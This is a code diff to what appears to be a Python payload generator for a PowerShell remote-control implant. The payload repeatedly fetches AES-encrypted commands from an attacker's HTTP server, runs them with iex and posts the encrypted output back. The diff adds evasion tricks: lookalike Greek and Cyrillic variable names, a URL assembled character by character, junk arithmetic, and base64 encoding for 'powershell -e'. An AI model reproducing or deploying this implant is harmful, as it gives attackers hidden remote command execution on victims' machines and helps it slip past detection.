@@ -11,7 +11,39 @@ PORT = 8000
 
 GREEN = '\033[38;5;47m'; END = '\033[0m'
 
-payload = f'$Key = [System.Text.Encoding]::UTF8.GetBytes("abcdefghijklmnop");$AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider;$AES.Mode = [System.Security.Cryptography.CipherMode]::CBC;$AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;$AES.Key = $Key;while ($true) {{$AES.IV = New-Object byte[] 16;$Decryptor = $AES.CreateDecryptor();$Response = Invoke-WebRequest -Uri "http://{ADDRESS}:{PORT}";$CipherText = [Convert]::FromBase64String($Response.Content);$PlainText = $Decryptor.TransformFinalBlock($CipherText, 0, $CipherText.Length);$Decrypted = [System.Text.Encoding]::UTF8.GetString($PlainText);$Exe = iex $Decrypted;$PlainText = [System.Text.Encoding]::UTF8.GetBytes($Exe);$Encryptor = $AES.CreateEncryptor();$CipherText = $Encryptor.TransformFinalBlock($PlainText, 0, $PlainText.Length);$Encoded = [Convert]::ToBase64String($CipherText);Invoke-WebRequest -Uri "http://{ADDRESS}:{PORT}" -Method POST -Body $Encoded}}'
+
+payload = f'''
+$Κ = [System.Text.Encoding]::UTF8.GetBytes("abcdefghijklmnop")
+$А = New-Object System.Security.Cryptography.AesCryptoServiceProvider
+$А.Mode = [System.Security.Cryptography.CipherMode]::CBC
+$А.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+$А.Key = $Κ
+$U='h'+ 't'+ 't'+ 'p'+':'+ '/'+'/'+ '0'+ '0'+'0'+'.'+'0'+ '0'+'0'+'.'+'0'+'0'+'0'+'.'+'0'+ '0'+ '0'+':'+ '8'+'0'+'0'+ '0'
+# ???????????????????????????????????????????¯\_(ツ)_/¯ 
+#
+while($true){{
+    
+    $А.IV=New-Object byte[] 16
+    $D=$А.CreateDecryptor()
+    $R=Invoke-WebRequest -Uri $U
+    $C=[Convert]::FromBase64String($R.Content)
+    $PT=$D.TransformFinalBlock($C, 0, $C.Length)
+    $D=[System.Text.Encoding]::UTF8.GetString($PT)
+    $E=iex $D
+    $PT=[System.Text.Encoding]::UTF8.GetBytes($E)
+    $E=$А.CreateEncryptor()
+    $C=$E.TransformFinalBlock($PT, 0, $PT.Length)
+    $C=[Convert]::ToBase64String($C)
+    
+    #
+    Invoke-WebRequest -Uri $U -Method POST -Body $C
+    #ツツツツツツツツツツツツツツツツツツツツツツツ ¯\_(?)_/¯  
+    $Θ = 10 + 2 * 3 / 4 - 5
+    $Γ = $Κ + $Θ
+    $Δ = $Γ + $Κ
+    $Ν = $Δ / 2
+}}
+'''
 e_payload = base64.b64encode(payload.encode('utf-16le')).decode('utf-8')
 print(f"{GREEN}PAYLOAD:{END}")
 print (f"powershell -e {e_payload}")
